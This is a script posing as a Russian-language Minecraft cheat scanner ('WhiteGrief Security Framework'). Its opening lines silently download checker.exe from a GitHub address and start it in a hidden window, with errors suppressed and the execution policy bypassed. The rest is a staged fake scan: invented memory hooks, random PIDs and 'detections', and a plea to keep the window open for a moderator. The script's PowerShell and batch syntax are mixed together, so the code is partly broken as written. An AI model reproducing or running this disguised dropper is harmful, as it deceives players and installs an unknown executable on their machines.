# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/checker.exe" -OutFile "checker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "checker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

setlocal enabledelayedexpansion
color 0b
title WhiteGrief Security Framework [Version 8.1.22]
mode con: cols=100 lines=30

echo [INFO] Запуск WhiteGrief Security Framework...
echo [INFO] Проверка сертификатов безопасности...
timeout /t 2 >nul

:loading
echo [HASH] Проверка целостности: [##########----------] 50%%
timeout /t 1 >nul
cls
echo [HASH] Проверка целостности: [####################] 100%%
timeout /t 1 >nul

echo ==========================================================================
echo                   WHITE GRIEF - ADVANCED SYSTEM SCANNER
echo ==========================================================================
echo СИСТЕМА: %COMPUTERNAME% | ПОЛЬЗОВАТЕЛЬ: %USERNAME%
echo СТАТУС: Глубокое сканирование оперативной памяти и кэша Java
echo ==========================================================================
echo.

echo [PROCESS] Поиск активных дескрипторов javaw.exe...
timeout /t 2 >nul
echo [OK] Процесс найден (PID: %RANDOM%). Начинаю инъекцию проверочного модуля...
timeout /t 3 >nul

echo [SCAN] Анализ JNI-методов на наличие подмен (Reach/Hitbox)...
echo [SCAN] Проверка классов: net.minecraft.client.entity.EntityPlayerSP
timeout /t 1 >nul
echo [SCAN] Проверка классов: net.minecraft.network.play.client.C03PacketPlayer
timeout /t 1 >nul
echo [SCAN] Проверка на наличие AutoClicker (анализ задержки MOUSE_EVENT)...
timeout /t 4 >nul

echo.
echo [!] ВНИМАНИЕ: Обнаружены подозрительные вызовы в стеке памяти.
echo [!] Адрес: 0x00007FF%RANDOM% - Тип: Persistent Memory Hook
timeout /t 2 >nul
echo.

echo [FILE] Сканирование временных файлов браузеров (Chrome/Opera/Yandex)...
timeout /t 1 >nul
echo [FILE] Анализ истории загрузок на ключевые слова: 'client', 'external', 'injector'...
timeout /t 3 >nul

echo [NET] Проверка входящего трафика на наличие сигнатур DLL-инъекций...
timeout /t 2 >nul
echo [NET] Анализ завершен. Пакеты синхронизированы.
echo.

echo --------------------------------------------------------------------------
echo                          РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ
echo --------------------------------------------------------------------------
echo [+] Модификации клиента: Minecraft 1.16.5 (Forge/Optifine)
echo [+] Подозрительные файлы: %RANDOM%.tmp (в папке Temp)
echo [+] Наложение (Overlay): Не обнаружено
echo [+] Макросы мыши: Обнаружена активность в фоновом режиме
echo --------------------------------------------------------------------------
echo.
echo [FINAL] Отчет сформирован и сохранен в директорию модерации.
echo [FINAL] Пожалуйста, не закрывайте это окно до конца диалога с модератором.
echo.
echo Нажмите любую клавишу для выхода...
pause >nul
